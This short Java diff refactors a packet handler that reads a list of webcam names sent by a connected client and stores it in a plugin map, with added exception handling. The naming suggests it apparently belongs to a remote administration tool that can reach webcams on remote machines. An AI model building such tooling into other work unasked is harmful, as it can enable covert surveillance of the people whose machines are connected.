@@ -10,13 +10,17 @@ public class Packet121ListWebcams extends PacketListener {
 
 	@Override
 	public void perform(Client client) {
-		int len = event.getServer().getDataReader().readInt();
-		
-		List<String> webcams = new ArrayList<String>();
-		
-		for (int i = 0; i < len; i++) {
-			webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
-			map.put(event.getServer(), webcams);
+		try {
+			int len = client.getDataReader().readInt();
+			
+			List<String> webcams = new ArrayList<String>();
+			
+			for (int i = 0; i < len; i++) {
+				webcams.add(WebcamPlugin.readString(client.getDataReader()));
+				WebcamPlugin.map.put(client, webcams);
+			}
+		} catch (Exception ex) {
+			ex.printStackTrace();
 		}
 	}
 
